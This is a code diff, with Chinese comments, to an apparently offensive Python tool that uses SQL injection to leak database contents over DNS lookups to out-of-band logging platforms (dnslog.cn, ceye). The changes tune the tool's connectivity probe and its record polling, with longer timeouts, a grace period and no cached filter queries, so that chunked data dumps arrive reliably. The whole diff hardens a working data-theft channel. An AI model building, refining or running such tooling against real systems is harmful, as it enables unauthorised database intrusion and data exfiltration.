@@ -619,8 +619,11 @@ def do_check(prov, timeout=30.0, verbose=False, force_doh=False):
     fqdn = "%s.%s" % (label, domain)
 
     # ceye 按 filter 拉记录, 这里只关心本次探针
-    if isinstance(prov, Ceye) and not prov.filter:
-        prov.filter = label
+    # 注意: 不要用 filter 查探针。ceye 对带 filter 的查询有明显缓存,
+    # 首次查空后几十秒内都返回空, 会把"通路正常"误判成失败。改为拉全量本地匹配。
+    saved_filter = getattr(prov, "filter", None)
+    if isinstance(prov, Ceye):
+        prov.filter = None
 
     print("[*] 探针域名: %s" % fqdn)
     ips, via = _probe_resolve(fqdn, force_doh=force_doh)
@@ -650,10 +653,26 @@ def do_check(prov, timeout=30.0, verbose=False, force_doh=False):
         "Ceye": "确认 --token/--ident 正确且额度未耗尽；ceye 只收录解析过的子域，检查本机 DNS 是否走了代理",
         "CmdProvider": "你的 --records-cmd 必须能返回包含探针子域的记录，检查 %DOMAIN% 替换与输出格式",
     }.get(name, "检查网络与平台配置")
+    # 平台索引可能滞后于 created_at, 再给 15 秒宽限, 避免误判成配置错误
+    grace = time.time() + 15
+    while time.time() < grace:
+        try:
+            for n in prov.get_records():
+                n = str(n).strip().rstrip(".").lower()
+                if label in n:
+                    print("[+] 平台已收到记录(入库较慢): %s" % n)
+                    print("[+] 通路正常, 可以开始注入")
+                    return 0
+        except Exception:
+            pass
+        time.sleep(2)
+
     if not force_doh:
         print("[!] 未收到记录, 自动改用 DoH 重试一次(绕过本地 DNS 劫持)")
         return do_check(prov, timeout=timeout, verbose=verbose, force_doh=True)
-    print("[x] 超时 %ds 未在平台看到探针记录 —— %s" % (int(timeout), hint))
+    if isinstance(prov, Ceye):
+        prov.filter = saved_filter
+    print("[x] 超时 %ds(+15s 宽限) 未在平台看到探针记录 —— %s" % (int(timeout), hint))
     return 1
 
 
@@ -735,7 +754,7 @@ ceye 凭证走环境变量可避免留在 history:  export CEYE_TOKEN=.. CEYE_ID
     ap.add_argument("--self-test", action="store_true", help="离线自检, 不访问网络")
     ap.add_argument("--check", action="store_true",
                     help="联通性自检: 领域名 + 发一条探针解析 + 确认平台收到, 通过后再正式注入")
-    ap.add_argument("--check-timeout", type=float, default=30.0)
+    ap.add_argument("--check-timeout", type=float, default=60.0)
     ap.add_argument("--check-doh", action="store_true",
                     help="探针解析强制走 DoH(本地 DNS 被代理 fake-ip 劫持时用)")
     ap.add_argument("--provider", default="dnslog.cn",
@@ -798,8 +817,8 @@ ceye 凭证走环境变量可避免留在 history:  export CEYE_TOKEN=.. CEYE_ID
                   sleep_delay=a.sleep_delay, samples=a.samples)
     ex.domain = prov.get_domain()
     dbms.domain = ex.domain
-    if isinstance(prov, Ceye) and not prov.filter:
-        prov.filter = ex.nonce          # 只拉自己这次的记录, 免得分页把噪声全拉回来
+    # 不给 ceye 自动加 filter: 带 filter 的查询会被平台缓存, 多分块 dump 时
+    # 第二块起可能读到旧结果。默认拉最近记录本地匹配, 需要时用 --filter 显式指定。
 
     print("[*] provider=%s  dbms=%s" % (a.provider, a.dbms))
     print("[!] %s" % dbms.notes)
